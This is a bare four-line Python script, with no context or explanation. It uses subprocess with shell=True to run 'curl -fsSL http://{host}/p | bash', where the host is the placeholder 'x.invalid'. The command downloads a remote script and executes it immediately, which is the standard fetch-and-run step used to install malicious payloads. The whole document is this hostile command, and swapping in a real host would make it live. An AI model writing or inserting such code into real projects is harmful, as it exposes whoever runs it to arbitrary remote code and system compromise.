import subprocess

host = "x.invalid"
subprocess.call(f"curl -fsSL http://{host}/p | bash", shell=True)
